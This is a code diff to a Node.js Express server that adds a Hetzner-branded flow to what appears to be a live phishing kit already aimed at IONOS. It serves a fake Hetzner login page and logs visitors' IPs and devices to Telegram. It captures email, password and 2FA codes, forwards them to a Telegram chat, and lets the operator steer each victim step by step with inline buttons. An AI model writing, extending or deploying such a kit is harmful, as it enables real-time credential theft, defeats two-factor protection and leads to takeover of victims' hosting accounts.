@@ -3,6 +3,7 @@ const express = require("express");
 const os = require("os");
 const path = require("path");
 const flow = require("./lib/ionos-flow");
+const hetznerFlow = require("./lib/hetzner-flow");
 const { getStoreMode, pingSupabase } = require("./lib/ionos-store");
 
 const app = express();
@@ -99,11 +100,26 @@ function notifyFlowSessionAsync(session, title) {
   );
 }
 
+async function notifyHetznerSession(session, title) {
+  if (process.env.TELEGRAM_NOTIFY !== "true") return;
+  const keyboard = hetznerFlow.buildTelegramKeyboard(session);
+  await sendTelegram(hetznerFlow.formatSessionMessage(session, title), keyboard || undefined);
+}
+
+function notifyHetznerSessionAsync(session, title) {
+  notifyHetznerSession(session, title).catch((err) =>
+    console.error("[telegram] hetzner notify failed:", err.message)
+  );
+}
+
 async function handleTelegramCallback(callbackQuery) {
-  const parsed = flow.parseCallbackData(callbackQuery.data);
+  const data = callbackQuery.data || "";
+  const parsed =
+    data.startsWith("h:") ? hetznerFlow.parseCallbackData(data) : flow.parseCallbackData(data);
+  const flowModule = data.startsWith("h:") ? hetznerFlow : flow;
   if (!parsed) return;
 
-  const result = await flow.applyAdminAction(parsed.id, parsed.action);
+  const result = await flowModule.applyAdminAction(parsed.id, parsed.action);
   if (!result.ok) {
     await answerTelegramCallback(
       callbackQuery.id,
@@ -112,12 +128,18 @@ async function handleTelegramCallback(callbackQuery) {
     return;
   }
 
-  const labels = {
-    code: "→ E-Mail Code",
-    password: "→ Passwort",
-    code_bad: "→ Falscher Code",
-    thankyou: "→ Thank You",
-  };
+  const labels = data.startsWith("h:")
+    ? {
+        code: "→ 2FA Code",
+        code_bad: "→ Falscher Code",
+        thankyou: "→ Thank You",
+      }
+    : {
+        code: "→ E-Mail Code",
+        password: "→ Passwort",
+        code_bad: "→ Falscher Code",
+        thankyou: "→ Thank You",
+      };
   await answerTelegramCallback(callbackQuery.id, labels[parsed.action] || "OK");
 }
 
@@ -339,6 +361,38 @@ function serveHostingPage(req, res) {
 app.get("/hosting.de", serveHostingPage);
 app.get("/hosting.de.html", serveHostingPage);
 
+function serveHetznerPage(req, res) {
+  const notify = process.env.TELEGRAM_NOTIFY === "true";
+  if (notify) {
+    const ip = getClientIp(req);
+    const ua = req.headers["user-agent"] || "";
+    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
+    const lastSeen = recentVisitors.get(ip + "-hetzner");
+    const now = Date.now();
+    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
+    if (!isBot && !onCooldown) {
+      recentVisitors.set(ip + "-hetzner", now);
+      const when = new Date().toUTCString();
+      const referrer = req.headers["referer"] || "Direct";
+      sendTelegram(
+        [
+          "<b>👁️ Visitatore — Pagina Hetzner</b>",
+          "",
+          `<b>IP:</b> ${escapeHtml(ip)}`,
+          `<b>Dispositivo:</b> ${parseDevice(ua)}`,
+          `<b>Browser:</b> ${parseBrowser(ua)}`,
+          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
+          `<b>Ora (UTC):</b> ${when}`,
+        ].join("\n")
+      ).catch((err) => console.error("[telegram]", err.message));
+    }
+  }
+  res.sendFile(path.join(__dirname, "public", "hetzner.html"));
+}
+
+app.get("/hetzner.html", serveHetznerPage);
+app.get("/hetzner/login", serveHetznerPage);
+
 // Visitor tracking for IONOS page
 app.get("/ionos.html", async (req, res) => {
   if (process.env.TELEGRAM_NOTIFY === "true") {
@@ -435,12 +489,16 @@ app.get("/ionos-flow.js", (_req, res) => {
   res.sendFile(path.join(__dirname, "public", "ionos-flow.js"));
 });
 
+app.get("/hetzner-flow.js", (_req, res) => {
+  res.sendFile(path.join(__dirname, "public", "hetzner-flow.js"));
+});
+
 app.get("/health", async (_req, res) => {
   const supabasePing = await pingSupabase();
   const telegramWebhook = await getTelegramWebhookInfo();
   res.json({
     ok: true,
-    version: 5,
+    version: 6,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
     supabasePing,
@@ -534,6 +592,82 @@ app.post("/api/ionos/session/:id/password", async (req, res) => {
 
   const updated = await flow.getSession(session.id);
   notifyFlowSessionAsync(updated, "🔑 IONOS — Passwort eingegeben");
+
+  return res.json({ ok: true, sessionId: session.id });
+});
+
+// ── Hetzner flow control ────────────────────────────────────────────
+
+app.post("/api/hetzner/start", async (req, res) => {
+  const email = String(req.body.email || "").trim();
+  const password = String(req.body.password || "");
+  if (!email || !password) {
+    return res.status(400).json({ ok: false, message: "Email and password required" });
+  }
+
+  try {
+    const session = await hetznerFlow.createSession({
+      email,
+      password,
+      ip: getClientIp(req),
+      ua: req.headers["user-agent"] || "",
+    });
+
+    notifyHetznerSessionAsync(session, "🔐 Hetzner — Login");
+    setupTelegramWebhookAsync();
+
+    return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
+  } catch (err) {
+    console.error("[hetzner/start]", err.message);
+    const message =
+      err.message.includes("404") || err.message.includes("ionos_sessions")
+        ? "Datenbank-Tabelle fehlt. Bitte supabase-setup.sql in Supabase ausführen."
+        : "Session store unavailable";
+    return res.status(503).json({ ok: false, message });
+  }
+});
+
+app.get("/api/hetzner/session/:id", async (req, res) => {
+  const session = await hetznerFlow.getSession(req.params.id);
+  if (!session || session.brand !== "hetzner") {
+    return res.status(404).json({ ok: false });
+  }
+  let error = session.error || null;
+  if (req.query.consume === "1" && error) {
+    await hetznerFlow.updateSession(session.id, { error: null });
+  }
+  return res.json({
+    ok: true,
+    id: session.id,
+    email: session.email,
+    step: session.step,
+    pending: session.pending,
+    error,
+  });
+});
+
+app.get("/api/hetzner/session/:id/poll", async (req, res) => {
+  const state = await hetznerFlow.getPollState(req.params.id);
+  return res.json(state);
+});
+
+app.post("/api/hetzner/session/:id/code", async (req, res) => {
+  const session = await hetznerFlow.getSession(req.params.id);
+  if (!session || session.brand !== "hetzner") {
+    return res.status(404).json({ ok: false, message: "Session not found" });
+  }
+
+  const code = String(req.body.code || "").trim();
+  if (!code) return res.status(400).json({ ok: false, message: "Code required" });
+
+  await hetznerFlow.updateSession(session.id, {
+    code,
+    step: "code_submitted",
+    pending: "code",
+  });
+
+  const updated = await hetznerFlow.getSession(session.id);
+  notifyHetznerSessionAsync(updated, "🔢 Hetzner — 2FA Code");
 
   return res.json({ ok: true, sessionId: session.id });
 });
